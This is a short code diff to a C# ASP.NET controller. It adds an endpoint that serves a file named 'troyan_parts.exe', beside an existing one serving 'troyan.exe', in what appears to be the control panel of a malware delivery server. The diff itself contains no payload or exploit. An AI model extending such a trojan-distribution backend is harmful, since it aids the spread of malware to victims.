@@ -212,6 +212,12 @@ public class CpController : Controller
         return GetFile(_serverService.GetExe(server), "troyan.exe");
     }
     
+    [HttpGet("{server}/GetExeNg")]
+    public IActionResult GetExeNg(string server)
+    {
+        return GetFile(_serverService.GetExeNg(server), "troyan_parts.exe");
+    }
+    
     protected async Task<IActionResult> GetFileAdvanced(string server, string file, string name, string random, string target, string randomMethod, string nofile)
     {
         try
